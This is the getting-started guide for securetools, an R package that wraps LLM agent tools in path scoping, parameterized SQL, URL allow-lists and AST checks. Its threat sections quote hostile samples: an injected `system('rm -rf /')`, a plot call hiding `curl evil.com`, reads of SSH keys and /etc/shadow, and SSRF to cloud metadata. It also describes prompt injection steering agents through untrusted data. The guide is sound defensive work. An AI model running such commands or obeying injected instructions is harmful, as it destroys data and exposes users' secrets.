# Getting Started with securetools

## Why security-hardened tools?

When you give an LLM agent access to tools, you hand executable
capabilities to a system trained to be helpful, not safe. A model that
can call [`system()`](https://rdrr.io/r/base/system.html) can run
arbitrary shell commands. A model with unrestricted file write can
overwrite `/etc/passwd` or plant a reverse shell. Raw SQL access lets a
model `DROP TABLE users` or exfiltrate every row from your production
database.

These are not theoretical risks. Research on prompt injection and
adversarial tool use has shown that LLM agents will follow
carefully-crafted instructions embedded in untrusted data – a
user-uploaded CSV, a web page fetched by the agent, a crafted column
name in a database result. If the tools have no safety boundaries, a
single successful injection compromises the host system.

securetools provides pre-built tool definitions with structural security
constraints. The tool physically cannot access files outside allowed
directories. It accepts structured parameters and constructs
parameterized queries internally. The agent never sees raw SQL, raw file
paths outside the sandbox, or unrestricted HTTP access.

## Overview

securetools provides pre-built, security-hardened tool definitions for
use with [securer](https://github.com/ian-flores/securer). Each tool
factory returns a
[`securer::securer_tool()`](https://ian-flores.github.io/securer/reference/securer_tool.html)
object with built-in constraints: path scoping, parameterized SQL,
domain allow-lists, size limits, and rate limiting.

## How tool execution works

Every securetools call follows the same execution flow. Validation
happens in the parent process, which the sandbox cannot influence.

      LLM Agent                 Parent Process (R)              Sandbox (securer)
      =========                 ==================              =================
          |                            |                               |
          |--- tool_call(args) ------->|                               |
          |                            |                               |
          |                     1. Validate args:                      |
          |                        - Check rate limit                  |
          |                        - Resolve symlinks                  |
          |                        - Match allow-lists                 |
          |                        - Verify size limits                |
          |                            |                               |
          |                     2. Reject? -----> Error to LLM         |
          |                            |                               |
          |                     3. Pass validated -------> Execute     |
          |                        call to sandbox         in sandbox  |
          |                            |                               |
          |                            |<------------- Result ---------|
          |                            |                               |
          |<--- result/error ----------|                               |

Validation runs in the parent process, which the sandboxed code cannot
modify or bypass. Even if a sandbox escape were possible, the
parent-level checks (path scoping, rate limits, SQL parameterization)
still apply because they execute before the call reaches the sandbox.

## Installation

``` r
# install.packages("pak")
pak::pak("ian-flores/securetools")
```

## Quick example

``` r
library(securetools)
library(securer)
```

### Calculator tool

The threat: an LLM asked to “calculate” something might generate
arbitrary R code instead of a simple arithmetic expression. Without
validation, `calculator(expression = "system('rm -rf /')")` would
execute a destructive shell command. Code injection through expression
evaluation is a well-understood attack vector.

The calculator tool evaluates mathematical expressions safely via AST
validation. It parses the expression into an abstract syntax tree and
walks every node, verifying that only arithmetic operators, math
functions, and numeric literals are present. Variable access,
assignment, and arbitrary function calls are all rejected before
evaluation ever occurs.

``` r
calc <- calculator_tool()
session <- SecureSession$new(tools = list(calc))

session$execute('calculator(expression = "sqrt(144) + 2^3")')
#> [1] 20

# This is rejected; system() is not an allowed function:
session$execute('calculator(expression = "system(\'whoami\')")')
#> Error: Function not allowed in calculator: `system`

session$close()
```

### File I/O tools

The threat: an agent with unrestricted file access can read secrets
(`~/.ssh/id_rsa`, `.env` files, `/etc/shadow`) or write to sensitive
locations. Path traversal attacks using `../../` sequences or symlinks
let an attacker escape any intended directory. An agent might also
exhaust disk space by writing extremely large files in a loop.

File I/O tools enforce path scoping with symlink resolution, size
limits, and directory allow-lists. Reading and writing are scoped
independently so you can give an agent read access to source data
without granting write access to the same directory:

``` r
# Only allow access to a specific directory
data_dir <- "/path/to/project/data"

reader <- read_file_tool(
  allowed_dirs = data_dir,
  max_file_size = "50MB",
  max_rows = 10000
)

writer <- write_file_tool(
  allowed_dirs = data_dir,
  max_file_size = "10MB",
  overwrite = FALSE
)

session <- SecureSession$new(tools = list(reader, writer))

# Read a CSV (auto-detects format from extension)
session$execute('
  data <- read_file(path = "/path/to/project/data/input.csv", format = "auto")
  head(data)
')

# Write results (path traversal is blocked)
session$execute('
  result <- data.frame(x = 1:5, y = letters[1:5])
  write_file(
    path = "/path/to/project/data/output.csv",
    content = result,
    format = "csv"
  )
')

session$close()
```

### SQL query tool

The threat: SQL injection is a well-known attack class. An LLM given a
raw SQL interface can be tricked (via prompt injection in user data or
fetched content) into running `DROP TABLE`, `UNION SELECT` for data
exfiltration, or `INSERT`/`UPDATE` to tamper with records. Parameterized
queries help, but they still require the developer to use them
correctly.

securetools eliminates the attack surface entirely: the agent never
writes SQL at all. The
[`query_sql_tool()`](https://ian-flores.github.io/securetools/reference/query_sql_tool.md)
exposes a structured interface where the agent specifies a table name,
column list, and optional filter. The tool constructs the SQL internally
using parameterized queries. Injection is structurally impossible
because the agent has no mechanism to supply raw SQL strings:

      Agent Request                           Tool Internals
      =============                           ==============
      table = "users"             --->   SELECT name, email
      columns = "name, email"           FROM users
      filter_column = "active"          WHERE active = ?
      filter_value = "1"                 [bound: "1"]

The table and column names are validated against allow-lists. Only
pre-approved tables can be queried, and column names are checked for SQL
injection patterns before being interpolated into the query.

``` r
library(DBI)
con <- dbConnect(RSQLite::SQLite(), "app.db")

sql_tool <- query_sql_tool(

  conn = con,
  allowed_tables = c("users", "orders"),
  max_rows = 1000
)

session <- SecureSession$new(tools = list(sql_tool))

# Query with filter (uses parameterized query internally)
session$execute('
  query_sql(
    table = "users",
    columns = "name, email",
    filter_column = "active",
    filter_value = "1"
  )
')

session$close()
dbDisconnect(con)
```

### URL fetch tool

The threat: an agent with unrestricted HTTP access can perform
Server-Side Request Forgery (SSRF), making requests to internal services
(`http://169.254.169.254` for cloud metadata, `http://localhost:8080`
for internal APIs) that are invisible from the public internet. It can
also exfiltrate data by POSTing to attacker-controlled endpoints, or
overwhelm external APIs with unbounded request loops.

The URL fetch tool constrains network access with domain allow-lists
(using glob patterns for subdomain matching), protocol restrictions
(HTTP/HTTPS only), private IP blocking, response size limits, and rate
limiting:

``` r
fetcher <- fetch_url_tool(
  allowed_domains = c("api.github.com", "*.githubusercontent.com"),
  max_response_size = "1MB",
  timeout_secs = 30,
  max_calls_per_minute = 10
)

session <- SecureSession$new(tools = list(fetcher))

session$execute('
  result <- fetch_url(url = "https://api.github.com/zen", method = "GET")
  result$body
')

session$close()
```

### Data profiling

The threat: profiling enormous datasets without limits can exhaust
memory and crash the host process. The
[`data_profile_tool()`](https://ian-flores.github.io/securetools/reference/data_profile_tool.md)
enforces row limits through sampling, so multi-million-row data frames
are summarized safely without consuming all available memory.

Compute summary statistics for data frames:

``` r
profiler <- data_profile_tool(max_rows = 100000)
session <- SecureSession$new(tools = list(profiler))

session$execute('
  profile <- data_profile(data = iris)
  profile$columns[[1]]  # Sepal.Length stats
')

session$close()
```

### Plot tool

The threat: R’s plotting system is powerful enough to execute arbitrary
code. An expression like `plot(x); system("curl evil.com")` embeds a
system call inside what looks like plotting code. Without restrictions,
the plot tool becomes a general-purpose code execution backdoor.

The plot tool evaluates plot expressions in a restricted environment
where only safe base R and graphics functions are available. Output is
also path-scoped and size-limited to prevent writing oversized files to
arbitrary locations:

``` r
plotter <- plot_tool(
  allowed_dirs = "/path/to/output",
  max_file_size = "5MB"
)

session <- SecureSession$new(tools = list(plotter))

session$execute('
  plot(
    path = "/path/to/output/chart.png",
    plot_code = "hist(rnorm(1000), main = \"Distribution\")",
    width = 8,
    height = 6
  )
')

session$close()
```

### R help lookup

The threat: unrestricted documentation lookup might seem harmless, but
it can leak information about installed packages and system
configuration. The `allowed_packages` parameter restricts which packages
can be queried, keeping the agent’s awareness scoped to what you intend.

The
[`r_help_tool()`](https://ian-flores.github.io/securetools/reference/r_help_tool.md)
gives safe access to R documentation:

``` r
help_tool <- r_help_tool(allowed_packages = c("base", "stats", "utils"))

session <- SecureSession$new(tools = list(help_tool))

# Look up documentation for a function
result <- session$call("r_help", topic = "mean", package = "base")
cat(result)

session$close()
```

## Security model

Every tool enforces constraints at the parent process level, not in the
sandbox. This means even if the sandbox is somehow bypassed, tool-level
protections still hold:

- Path scoping: symlinks are resolved before checking allowed
  directories
- Parameterized SQL: structured interface prevents injection by design
- Domain allow-lists: URL validation before any HTTP request
- Size limits: checked after serialization (write) or before processing
  (read)
- Rate limiting: per-tool lifetime and/or sliding window limits
- AST validation: calculator expression safety via recursive AST walking

## Security considerations

### Threat model

securetools protects against an untrusted LLM agent attempting to:

- Read sensitive files: path validation with symlink resolution prevents
  directory traversal
- Write to arbitrary locations: write paths are validated against
  allowed directories
- Execute arbitrary code: calculator uses AST validation; plot tool
  restricts to plotting functions
- Access internal services (SSRF): URL fetching validates protocols
  (HTTP/HTTPS only) and blocks private IPs
- SQL injection: structured query interface with parameterized filters
  prevents raw SQL injection
- Resource exhaustion: rate limiting and size limits constrain resource
  usage

### Known limitations

- TOCTOU races: between path validation and file I/O, a symlink could
  theoretically be swapped. Use `validate_written_path()` for post-write
  verification.
- Rate limiting is per-process: limits reset if the R process restarts.
  For persistent rate limiting, use an external mechanism.
- DNS rebinding: the private IP check resolves DNS before the request,
  but DNS rebinding attacks could bypass this.
- Base R access in restricted environments: the plot tool’s restricted
  environment still provides access to safe base R functions. The
  allowlist is comprehensive but may need updates for new R versions.

### Working with SecureSession

When tools are called through `SecureSession` IPC, all tool arguments
must be specified explicitly. The child process wrappers do not carry
default values from the tool factory. For example, always specify
`format = "auto"` even though it’s the default in direct usage.

## Rate limiting

Agent loops are unbounded by default. A ReAct agent keeps calling tools
until it decides it has an answer or hits a token limit. Without rate
limiting, a confused or manipulated agent could make thousands of API
calls, exhaust disk I/O, or run up cloud costs. Rate limits impose a
hard boundary independent of the LLM’s decision-making.

All tool factories accept `max_calls` for lifetime rate limiting. Some
tools (like
[`fetch_url_tool()`](https://ian-flores.github.io/securetools/reference/fetch_url_tool.md))
also support `max_calls_per_minute` for sliding-window throttling. When
a limit is hit, the tool returns an error message to the LLM rather than
silently failing, giving the agent a chance to adjust its strategy:

``` r
# Allow only 100 calculator evaluations per session
calc <- calculator_tool(max_calls = 100)

# URL fetch with both lifetime and per-minute limits
fetcher <- fetch_url_tool(
  max_calls = 1000,
  max_calls_per_minute = 10
)
```

## Available tools

| Tool         | Factory                                                                                          | Key Security Features                           |
|--------------|--------------------------------------------------------------------------------------------------|-------------------------------------------------|
| Calculator   | [`calculator_tool()`](https://ian-flores.github.io/securetools/reference/calculator_tool.md)     | AST validation, no code injection               |
| Data Profile | [`data_profile_tool()`](https://ian-flores.github.io/securetools/reference/data_profile_tool.md) | Row sampling for large data                     |
| Read File    | [`read_file_tool()`](https://ian-flores.github.io/securetools/reference/read_file_tool.md)       | Path scoping, size limits                       |
| Write File   | [`write_file_tool()`](https://ian-flores.github.io/securetools/reference/write_file_tool.md)     | Path scoping, size limits, overwrite protection |
| SQL Query    | [`query_sql_tool()`](https://ian-flores.github.io/securetools/reference/query_sql_tool.md)       | Table allow-list, parameterized queries         |
| URL Fetch    | [`fetch_url_tool()`](https://ian-flores.github.io/securetools/reference/fetch_url_tool.md)       | Domain allow-list, rate limiting                |
| Plot         | [`plot_tool()`](https://ian-flores.github.io/securetools/reference/plot_tool.md)                 | Path scoping, output size limits                |
| R Help       | [`r_help_tool()`](https://ian-flores.github.io/securetools/reference/r_help_tool.md)             | Package allow-list                              |
